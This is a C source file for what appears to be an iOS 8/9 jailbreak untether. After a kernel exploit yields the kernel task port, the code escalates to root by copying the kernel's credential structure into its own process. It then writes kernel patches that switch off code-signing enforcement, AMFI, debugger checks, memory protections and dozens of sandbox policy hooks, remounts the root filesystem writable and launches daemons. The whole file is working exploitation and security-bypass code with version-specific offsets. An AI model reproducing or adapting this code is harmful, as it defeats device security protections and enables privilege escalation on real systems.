#include <spawn.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#include <mach/mach.h>

#include "../IOKit/IOKitLib.h"

#include "../oob_entry/oob_entry.h"
#include "../oob_entry/memory.h"
#include "jailbreak.h"
#include "patchfinder.h"
#include "mac_policy_ops.h"

struct utsname u = { 0 };
static char *ckernv;

static bool isIOS9 = false;
static bool isA5 = false;

void patch_bootargs(uint32_t addr){
    //printf("set bootargs\n");
    uint32_t bootargs_addr = kread32(addr) + 0x38;
    const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";

    // evasi0n6
    size_t new_bootargs_len = strlen(new_bootargs) + 1;
    size_t bootargs_buf_len = (new_bootargs_len + 3) / 4 * 4;
    char bootargs_buf[bootargs_buf_len];

    strlcpy(bootargs_buf, new_bootargs, bootargs_buf_len);
    memset(bootargs_buf + new_bootargs_len, 0, bootargs_buf_len - new_bootargs_len);
    kwrite_buf(bootargs_addr, bootargs_buf, bootargs_buf_len);
}

// debugger 1 and 2 for a5(x) 9.x
uint32_t find_PE_i_can_has_debugger_1(void) {
    uint32_t PE_i_can_has_debugger_1;
    if (strstr(ckernv, "3248.61")) {
        print_log("9.3.5-9.3.6\n");
        PE_i_can_has_debugger_1 = 0x3a82c4;
    } else if (strstr(ckernv, "3248.60")) {
        print_log("9.3.3-9.3.4\n");
        PE_i_can_has_debugger_1 = 0x3a82d4;
    } else if (strstr(ckernv, "3248.50")) {
        print_log("9.3.2\n");
        PE_i_can_has_debugger_1 = 0x3a7ff4;
    } else if (strstr(ckernv, "3248.41")) {
        print_log("9.3-9.3.1\n");
        PE_i_can_has_debugger_1 = 0x3a7ea4;
    } else if (strstr(ckernv, "3248.31")) {
        print_log("9.2.1\n");
        PE_i_can_has_debugger_1 = 0x3a1434;
    } else if (strstr(ckernv, "3248.21")) {
        print_log("9.2\n");
        PE_i_can_has_debugger_1 = 0x3a12c4;
    } else if (strstr(ckernv, "3248.10")) {
        print_log("9.1\n");
        PE_i_can_has_debugger_1 = 0x3aa734;
    } else {
        print_log("9.0-9.0.2\n");
        PE_i_can_has_debugger_1 = 0x3a8fc4;
    }
    return PE_i_can_has_debugger_1;
}

uint32_t find_PE_i_can_has_debugger_2(void) {
    uint32_t PE_i_can_has_debugger_2;
    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        print_log("9.3.x\n");
        PE_i_can_has_debugger_2 = 0x456070;
    } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
        print_log("9.2-9.2.1\n");
        PE_i_can_has_debugger_2 = 0x44f070;
    } else if (strstr(ckernv, "3248.10")) {
        print_log("9.1\n");
        PE_i_can_has_debugger_2 = 0x457860;
    } else {
        print_log("9.0-9.0.2\n");
        PE_i_can_has_debugger_2 = 0x4567d0;
    }
    return PE_i_can_has_debugger_2;
}

void unjail8(void){
    print_log("[*] jailbreaking...\n");

    print_log("[*] running kdumper\n");

    uint32_t kbase = kinfo->kernel_base;
    size_t ksize = 0xFFE000;
    void *kdata = calloc(1, ksize);
    kread_buf(kbase, kdata, ksize);

    /* patchfinder */
    print_log("[*] running patchfinder\n");
    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2(kbase, kdata, ksize);
    uint32_t p_bootargs = kbase + find_p_bootargs(kbase, kdata, ksize);
    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch_84(kbase, kdata, ksize);
    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch_84(kbase, kdata, ksize);
    uint32_t mount_patch = kbase + find_mount_84(kbase, kdata, ksize) + 1;
    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
    uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);

    print_log("[PF] proc_enforce:               %08x\n", proc_enforce);
    print_log("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    print_log("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    print_log("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    print_log("[PF] p_bootargs:                 %08x\n", p_bootargs);
    print_log("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    print_log("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    print_log("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    print_log("[PF] mount_patch:                %08x\n", mount_patch);
    print_log("[PF] mapForIO:                   %08x\n", mapForIO);
    print_log("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    print_log("[PF] csops:                      %08x\n", csops_addr);
    print_log("[PF] csops2:                     %08x\n", csops2_addr);

    print_log("[*] running kernelpatcher\n");

    /* proc_enforce: -> 0 */
    print_log("[*] proc_enforce\n");
    kwrite32(proc_enforce, 0);

    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    print_log("[*] cs_enforcement_disable_amfi\n");
    kwrite8(cs_enforcement_disable_amfi, 1);
    kwrite8(cs_enforcement_disable_amfi-4, 1);

    /* debug_enabled -> 1 */
    print_log("[*] debug_enabled\n");
    kwrite32(PE_i_can_has_debugger_1, 1);
    kwrite32(PE_i_can_has_debugger_2, 1);

    /* bootArgs */
    print_log("[*] bootargs\n");
    patch_bootargs(p_bootargs);

    /* vm_fault_enter */
    print_log("[*] vm_fault_enter\n");
    kwrite32_exec(vm_fault_enter, 0x2201bf00);

    /* vm_map_enter */
    print_log("[*] vm_map_enter\n");
    kwrite32_exec(vm_map_enter, 0x4280bf00);

    /* vm_map_protect: set NOP */
    print_log("[*] vm_map_protect\n");
    kwrite32_exec(vm_map_protect, 0xbf00bf00);

    /* mount patch */
    print_log("[*] mount patch\n");
    kwrite8_exec(mount_patch, 0xe0);

    /* mapForIO: prevent kIOReturnLockedWrite error */
    print_log("[*] mapForIO\n");
    kwrite32_exec(mapForIO, 0xbf00bf00);

    /* csops */
    print_log("[*] csops\n");
    kwrite32_exec(csops_addr, 0xbf00bf00);
    kwrite8_exec(csops2_addr, 0x20);

    /* sandbox */
    print_log("[*] sandbox\n");
    kwrite32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);

    uint32_t sbopsoffset = kbase + find_sbops(kbase, kdata, ksize);

    print_log("nuking sandbox\n");
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
    print_log("nuked sandbox\n");

    print_log("[*] patch tfp0\n");
    uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
    print_log("[PF] tfp0_patch: %08x\n", tfp0_patch);
    kwrite32_exec(tfp0_patch, 0xbf00bf00);

    print_log("enable patched.\n");
}

void unjail9(void){
    print_log("[*] jailbreaking...\n");

    print_log("[*] running kdumper\n");
    uint32_t kbase = kinfo->kernel_base;
    size_t ksize = 0xFFE000;
    void *kdata = calloc(1, ksize);
    kread_buf(kbase, kdata, ksize);

    /* patchfinder */
    print_log("[*] running patchfinder\n");
    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
    uint32_t p_bootargs = kbase + find_p_bootargs_generic(kbase, kdata, ksize);
    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
    uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1;
    uint32_t PE_i_can_has_debugger_2;
    uint32_t mount_patch;
    uint32_t mapForIO;
    uint32_t i_can_has_kernel_configuration_got;
    uint32_t lwvm_jump;

    if (isA5) {
        PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
        PE_i_can_has_debugger_2 = kbase + find_PE_i_can_has_debugger_2();
    } else {
        PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
        PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
    }

    if (strstr(ckernv, "3248.1.")) {
        mount_patch = kbase + find_mount_90(kbase, kdata, ksize);
    } else {
        mount_patch = kbase + find_mount(kbase, kdata, ksize);
    }

    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        i_can_has_kernel_configuration_got = kbase + find_PE_i_can_has_kernel_configuration_got(kbase, kdata, ksize);
        lwvm_jump = kbase + find_lwvm_jump(kbase, kdata, ksize);
        print_log("[PF] i_can_has_kernel_configuration_got: %08x\n", i_can_has_kernel_configuration_got);
        print_log("[PF] lwvm_jump:                  %08x\n", lwvm_jump);
    } else {
        mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
        print_log("[PF] mapForIO:                   %08x\n", mapForIO);
    }

    print_log("[PF] proc_enforce:               %08x\n", proc_enforce);
    print_log("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    print_log("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    print_log("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    print_log("[PF] p_bootargs:                 %08x\n", p_bootargs);
    print_log("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    print_log("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    print_log("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    print_log("[PF] mount_patch:                %08x\n", mount_patch);
    print_log("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    print_log("[PF] csops:                      %08x\n", csops_addr);
    print_log("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);

    print_log("[*] running kernelpatcher\n");

    /* proc_enforce: -> 0 */
    print_log("[*] proc_enforce\n");
    kwrite32(proc_enforce, 0);

    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    print_log("[*] cs_enforcement_disable_amfi\n");
    kwrite8(cs_enforcement_disable_amfi, 1);
    kwrite8(cs_enforcement_disable_amfi-1, 1);

    /* bootArgs */
    print_log("[*] bootargs\n");
    patch_bootargs(p_bootargs);

    /* debug_enabled -> 1 */
    print_log("[*] debug_enabled\n");
    kwrite32_exec(PE_i_can_has_debugger_1, 1);
    kwrite32_exec(PE_i_can_has_debugger_2, 1);

    /* vm_fault_enter */
    print_log("[*] vm_fault_enter\n");
    kwrite16_exec(vm_fault_enter, 0x2201);

    /* vm_map_enter */
    print_log("[*] vm_map_enter\n");
    kwrite32_exec(vm_map_enter, 0xbf00bf00);

    /* vm_map_protect: set NOP */
    print_log("[*] vm_map_protect\n");
    kwrite32_exec(vm_map_protect, 0xbf00bf00);

    /* mount patch */
    print_log("[*] mount patch\n");
    if (strstr(ckernv, "3248.1.")) {
        kwrite8_exec(mount_patch, 0xe7);
    } else {
        kwrite8_exec(mount_patch, 0xe0);
    }

    /* mapForIO: prevent kIOReturnLockedWrite error */
    print_log("[*] mapForIO\n");
    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        kwrite32_exec(i_can_has_kernel_configuration_got, lwvm_jump);
    } else {
        kwrite32_exec(mapForIO, 0xbf00bf00);
    }

    /* csops */
    print_log("[*] csops\n");
    kwrite32_exec(csops_addr, 0xbf00bf00);

    /* amfi_file_check_mmap */
    print_log("[*] amfi_file_check_mmap\n");
    kwrite32_exec(amfi_file_check_mmap, 0xbf00bf00);

    /* sandbox */
    print_log("[*] sandbox\n");
    kwrite32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);

    uint32_t sbopsoffset = kbase + find_sbops(kbase, kdata, ksize);

    print_log("nuking sandbox\n");
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
    kwrite32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
    print_log("nuked sandbox\n");

    print_log("[*] patch tfp0\n");
    uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
    print_log("[PF] tfp0_patch: %08x\n", tfp0_patch);
    kwrite32_exec(tfp0_patch, 0xbf00bf00);

    print_log("enable patched.\n");
}

void jailbreak_init(void) {
    uname(&u);
    ckernv = strdup(u.version);
    print_log("kern.version: %s\n", ckernv);

    if (strstr(ckernv, "3248") || strstr(ckernv, "3247")) {
        print_log("isIOS9? yes\n");
        isIOS9 = true;
    }

    if (strstr(ckernv, "S5L894")) {
        print_log("isA5? yes\n");
        isA5 = true;
    }
}

#ifdef UNTETHER
void load_jb(void){
    // remount rootfs
    print_log("[*] remounting rootfs\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    print_log("remount = %d\n",mntr);

    const char *jl;
    pid_t pd = 0;

    int f = open("/.installed_daibutsu", O_RDONLY);
    if (f == -1) {
        chmod("/private", 0777);
        chmod("/private/var", 0777);
        chmod("/private/var/mobile", 0777);
        chmod("/private/var/mobile/Library", 0777);
        chmod("/private/var/mobile/Library/Preferences", 0777);

        posix_spawn(&pd, "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", 0, 0, (char**)&(const char*[]){"/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", NULL}, NULL);
        print_log("[*] pid = %x\n", pd);
        waitpid(pd, 0, 0);
        sleep(3);

        open("/.installed_daibutsu", O_RDWR|O_CREAT);
        chmod("/.installed_daibutsu", 0644);
        chown("/.installed_daibutsu", 0, 0);
    }

    print_log("[*] loading JB\n");
    // substrate: run "dirhelper"
    jl = "/bin/bash";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
    waitpid(pd, NULL, 0);

    usleep(10000);

    // looks like this doesnt work with jsc untether, will use daemonloader instead, launched by dirhelper above
    jl = "/bin/launchctl";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);

    usleep(10000);
}

void failed(void){
    print_log("[-] failed to execute untether. rebooting.\n");
    reboot(0);
}

int main(void){
    jailbreak_init();

    run_exploit(1020);

    if(kinfo->tfp0){
        print_log("[*] got tfp0: %x\n", kinfo->tfp0);
    } else {
        print_log("[-] Failed to get tfp0\n");
        failed();
        return -1;
    }

    uint32_t self_ucred = 0;
    uint8_t proc_ucred = 0x8c;
    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        proc_ucred = 0xa4;
    } else if (strstr(ckernv, "3248.3") || strstr(ckernv, "3248.2") || strstr(ckernv, "3248.10")) {
        proc_ucred = 0x98;
    }
    if (getuid() != 0 || getgid() != 0) {
        print_log("[*] Set uid to 0 (proc_ucred: %x)...\n", proc_ucred);
        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + proc_ucred);
        self_ucred = kread32(kinfo->self_proc_addr + proc_ucred);
        kwrite32(kinfo->self_proc_addr + proc_ucred, kern_ucred);
        setuid(0);
        setgid(0);
    }
    if (getuid() != 0 || getgid() != 0) return -1;

    if(!isIOS9){
        unjail8();
    } else {
        unjail9();
    }
    load_jb();

    print_log("[*] DONE!\n");

    return 0;
}
#endif
